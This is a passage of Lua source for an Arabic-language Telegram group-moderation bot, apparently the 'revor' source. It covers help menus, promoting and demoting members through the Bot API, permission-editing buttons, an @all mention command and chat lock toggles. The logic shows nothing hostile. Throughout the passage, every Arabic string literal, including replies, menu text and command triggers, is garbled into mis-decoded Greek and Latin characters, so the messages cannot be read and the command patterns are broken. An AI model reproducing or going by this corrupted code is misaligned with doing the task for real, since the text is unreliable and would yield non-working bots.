Ω­ ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ―ΩΨ§
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ―
β β β β β β β β β
Ω­ ΩΨͺΨΊΩΨ± Ψ±Ψ―ΩΨ― Ψ§ΩΨ§ΩΨ―Ω :- 
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ + Ψ§ΩΩΨ΅
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ω4' and Creator(msg) then
Text = [[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦
Ω­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ

Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±
Ω­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
Ω­ ΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω
Ω­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ§ΩΨ±
Ω­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
Ω­ Ψ­Ψ°Ω/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
Ω­ Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
Ω­ Ψ§ΨΆΩ ΩΩΨ§Ψ· + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ω5' and DevBot(msg) then
Text = [[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω 
β β β β β β β β β
Ω­ Ψ­ΨΈΨ± ΨΉΨ§Ω
Ω­ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω
Ω­ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω
Ω­ ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ
Ω­ Ψ§ΨΆΩ /ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± 
Ω­ Ψ§ΩΩΨ·ΩΨ±ΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ
Ω­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω 
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ
Ω­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ 
Ω­ ΩΨΆΨΉ /Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ± 

Ω­ ΨͺΨ­Ψ―ΩΨ« + ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ 

Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ 
Ω­ ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ + Ψ§ΩΨΉΨ―Ψ―
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ψ©
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ 
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ ΩΩΩ + Ψ§Ψ³Ω Ψ§ΩΩΩΩ
Ω­ Ψ§ΩΩΩΩΨ§Ψͺ 
Ω­ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ 
Ω­ Ψ§ΩΩΨͺΨ¬Ψ± 
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± 
β β β β β β β β β
Ω­ ΨͺΩΨΉΩΩ /ΨͺΨΉΨ·ΩΩ

Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ 
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω
Ω­ Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ 
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ
Ω­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
Ω­ ΨΊΨ§Ψ―Ψ± 
Ω­ ΨΊΨ§Ψ―Ψ± + Ψ§ΩΨ§ΩΨ―Ω
Ω­ Ψ§Ψ°Ψ§ΨΉΩ 
Ω­ Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ
Ω­ Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ 
Ω­ Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ 
Ω­ Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ 
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ω6' then
Text = [[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ³ΩΩΩ
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ¨
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ§Ψ¨
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ²ΩΨ¬ΨͺΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ²ΩΨ¬Ψ§Ψͺ
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ±Ψ―
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨ±ΩΨ―
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ­ΩΨ§Ψ±
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ­ΩΩΨ±
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨͺΨ?Ψ²ΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨͺΨ?Ψ²ΩΩΩΩ
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨͺΩΨ­Ψ―
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨͺΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ§Ψͺ
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ²Ω
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨ²Ψ²
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ­ΩΨ§Ω
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ­ΩΨ§ΩΩΩ
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ?ΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ?ΩΩΨ§Ψͺ
Ω­ Ψ±ΩΨΉ Ψ¨ΩΩΨ¨Ω / ΨͺΩΨ²ΩΩ ΩΩ ΩΩΨ¨Ω
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text and text:match("ΨΆΨΉ ΩΩΨ¨ (.*)") and tonumber(msg.reply_to_message_id_) ~= 0 and Creator(msg) then
local namess = text:match("ΨΆΨΉ ΩΩΨ¨ (.*)")
function Function_Tshake(extra, result, success)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨΉΨΉΩΩ ΩΩΨ¨") 
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&custom_title="..namess)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^(ΨΆΨΉ ΩΩΨ¨) @(.*) (.*)$") and Creator(msg) then
local username = {string.match(text, "^(ΨΆΨΉ ΩΩΨ¨) @(.*) (.*)$")}
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨΉΩΩΩ ΩΩΨ¨") 
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&custom_title="..username[3])
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username[2]}, Function_Tshake, nil)
return false
end
------by-dev-7oda
if text == ("ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ") and tonumber(msg.reply_to_message_id_) ~= 0 and Creator(msg) then
function Function_Tshake(extra, result, success)
local Text = "Ω­ Ψ§Ψ?ΨͺΨ± ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
--------------
if text == ("Ψ±ΩΨΉ") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function mahmoud(extra, result, success)
local Text = "Ω­ Ψ§Ψ?ΨͺΨ± Ψ§ΩΨ±ΨͺΨ¨Ω"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ±ΩΨΉ ΩΩΩΨ²', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/setspecial"}
},
{
{text = 'Ψ±ΩΨΉ Ψ§Ψ―ΩΩ', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/aetadmin"}
},
{
{text = 'Ψ±ΩΨΉ ΩΨ―ΩΨ±', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/gsetma"}
},
{
{text = 'Ψ±ΩΨΉ ΩΩΨ΄Ψ¦', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/metmonsh"}
},
{
{text = 'Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/ketmonshs"}
},
{
{text = 'Ψ±ΩΨΉ ΩΨ§ΩΩ', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/oetowner"}
},
{
{text = 'Ψ±ΩΨΉ ΩΨ·ΩΨ±', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/detdev"}
},
{
{text = 'Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/fetdevs"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mahmoud, nil)
return false
end
if text and text:match("^ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ @(.*)$") and Creator(msg) then
local username = text:match("^ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end
local Text = "Ω­ Ψ§Ψ?ΨͺΨ± ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == ("Ψ±ΩΨΉ ΩΨ΄Ψ±Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Creator(msg) then
function Function_Tshake(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
local Text = "Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ΄Ψ±Ω"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω @(.*)$") and Creator(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
local Text = "Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ΄Ψ±Ω"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Creator(msg) then
function Function_Tshake(extra, result, success)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ΄Ψ±ΩΩΩ") 
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_manage_chat=false&can_manage_voice_chats=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω @(.*)$") and Creator(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ΄Ψ±ΩΩΩ") 
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_manage_chat=false&can_manage_voice_chats=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ§Ω' and Creator(msg) then 
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± @all'
database:del(bot_id..'Cick:all'..msg.chat_id_) 
else
Text = ' β’ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ§Ω' and Creator(msg) then 
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true) 
Text = '\n β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± @all'
else
Text = '\n β’ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^all (.*)$") or text:match("^@all (.*)$") and Admin(msg) then 
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$") 
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then 
if database:get(bot_id.."cccbcc:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then   
return  
send(msg.chat_id_, msg.id_,"Ψ§ΩΨͺΨΈΨ± Ψ―ΩΩΩΩ ΩΩ ΩΨΆΩΩ") 
end 
database:setex(bot_id..'cccbcc:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa)  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi) 
x = 0 
tags = 0 
local list = sofi.members_ 
for k, v in pairs(list) do 
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) 
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
t = "#all "..ttag.."" 
end 
x = x + 1 
tagname = data.first_name_ 
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")" 
if x == 5 or x == tags or k == 0 then 
local Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
sendText(msg.chat_id_,Text,0,'md') 
end 
end,nil) 
end 
end,nil) 
end,nil) 
end 
end


if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ' and Admin(msg) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΩΩΩ ΩΩΨͺΨ­ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockjoine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockjoine"},{text = 'ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockinlene"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockinlene"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=msg.sender_user_id_.."/lock_joine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=msg.sender_user_id_.."/unlock_joine"},{text = 'ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockbots"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockbots"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=msg.sender_user_id_.."/locktags"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=msg.sender_user_id_.."/unlocktags"},{text = 'ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=msg.sender_user_id_.."/lockedit"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockedit"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockusername"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockusername"},{text = 'ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/locklink"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/unlocklink"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨ§Ω', callback_data=msg.sender_user_id_.."/locktag"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω', callback_data=msg.sender_user_id_.."/unlocktag"},{text = 'ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/locksticar"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlocksticar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ', callback_data=msg.sender_user_id_.."/lockvideo"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockvideo"},{text = 'ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=msg.sender_user_id_.."/lockgif"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=msg.sender_user_id_.."/unlockgif"},
},
{
